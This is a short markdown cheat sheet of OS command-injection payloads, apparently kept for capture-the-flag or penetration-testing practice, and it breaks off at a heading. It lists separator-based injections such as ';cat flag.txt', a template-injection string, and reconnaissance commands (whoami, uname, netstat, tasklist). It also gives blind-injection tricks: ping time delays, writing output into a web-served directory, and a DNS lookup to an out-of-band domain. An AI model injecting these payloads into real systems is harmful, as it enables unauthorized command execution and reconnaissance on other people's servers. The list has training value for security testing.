### { Payloads }

---

```py
ls;ls
```

```py
;cat flag.txt
```
```py
;ls
```
```py
{{request.args|safe}}
```

```py
& echo abcdef &
```

#### Useful commands

```py
whoami
uname -a
ver
ifconfig
ipconfig/all
netstat -an
ps -ef
tasklist
```

#### Blind injections - When output isn't returned

```py
& ping -c 10 127.0.0.1 & #Time delays
& whoami > /var/www/static/whoami.txt & #Redirecting the input
& nslookup abcd.company.com & #DNS lookup
```

#### Ways to inject OS command

```py

